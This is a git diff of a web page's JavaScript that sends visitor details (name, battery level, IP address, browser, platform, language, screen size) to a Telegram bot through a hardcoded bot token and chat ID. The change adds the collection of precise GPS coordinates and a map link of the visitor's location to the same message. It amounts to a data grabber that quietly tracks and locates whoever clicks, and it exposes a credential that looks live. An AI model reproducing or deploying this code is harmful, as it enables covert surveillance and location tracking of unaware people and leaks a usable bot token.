@@ -34,25 +34,54 @@ document.getElementById('sendInfoButton').addEventListener('click', async functi
     const screenHeight = window.screen.height; // Screen height
     const onlineStatus = navigator.onLine ? 'Online' : 'Offline'; // Online status
 
-    // Construct the message text with additional info
-    const botToken = '6524346899:AAFrXk72Y4VAfMXWsCoLfUPpRy-oSx4fefo';
-    const chatId = '5747112293'; // Your chat ID
-    const messageText = `
-        User Info:
-        Name: ${name}
-        Battery Level: ${batteryLevel}
-        IP Address: ${ipAddress}
-        User Agent: ${userAgent}
-        Platform: ${platform}
-        Language: ${language}
-        Screen Size: ${screenWidth} x ${screenHeight}
-        Status: ${onlineStatus}
-    `; // Multi-line message for better readability
+    // Initialize location info
+    let locationInfo = 'N/A';
+    let staticMapUrl = ''; // Initialize static map URL
 
-    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    // Get Location
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                const { latitude, longitude } = position.coords;
+                locationInfo = `Latitude: ${latitude}, Longitude: ${longitude}`;
 
-    try {
-        const response = await fetch(url, {
+                // Create a static map image URL
+                staticMapUrl = `https://maps.googleapis.com/maps/api/staticmap?center=${latitude},${longitude}&zoom=15&size=600x300&markers=color:red%7Clabel:C%7C${latitude},${longitude}&key=YOUR_API_KEY`;
+
+                // Send the info after getting location
+                sendMessage(staticMapUrl);
+            },
+            (error) => {
+                console.error('Error getting location:', error);
+                sendMessage(staticMapUrl); // Call the function to send the info even if location retrieval fails
+            }
+        );
+    } else {
+        sendMessage(staticMapUrl); // If geolocation is not supported, still send info
+    }
+
+    // Function to send the information to Telegram
+    function sendMessage(mapUrl) {
+        // Construct the message text with additional info
+        const botToken = '6524346899:AAFrXk72Y4VAfMXWsCoLfUPpRy-oSx4fefo';
+        const chatId = '5747112293'; // Your chat ID
+        const messageText = `
+            User Info:
+            Name: ${name}
+            Battery Level: ${batteryLevel}
+            IP Address: ${ipAddress}
+            User Agent: ${userAgent}
+            Platform: ${platform}
+            Language: ${language}
+            Screen Size: ${screenWidth} x ${screenHeight}
+            Status: ${onlineStatus}
+            Location: ${locationInfo}
+            Map: ${mapUrl} // Include the static map URL in the message
+        `; // Multi-line message for better readability
+
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+        fetch(url, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
@@ -61,19 +90,20 @@ document.getElementById('sendInfoButton').addEventListener('click', async functi
                 chat_id: chatId,
                 text: messageText
             })
+        })
+        .then(response => response.json())
+        .then(responseData => {
+            console.log('Response from Telegram:', responseData);
+            if (responseData.ok) {
+                alert('Information sent successfully!');
+            } else {
+                console.error('Error sending message:', responseData.description);
+                alert('Failed to send information. Please try again.');
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            alert('An error occurred. Please try again.');
         });
-
-        const responseData = await response.json();
-        console.log('Response from Telegram:', responseData);
-
-        if (response.ok) {
-            alert('Information sent successfully!');
-        } else {
-            console.error('Error sending message:', responseData.description);
-            alert('Failed to send information. Please try again.');
-        }
-    } catch (error) {
-        console.error('Error:', error);
-        alert('An error occurred. Please try again.');
     }
 });
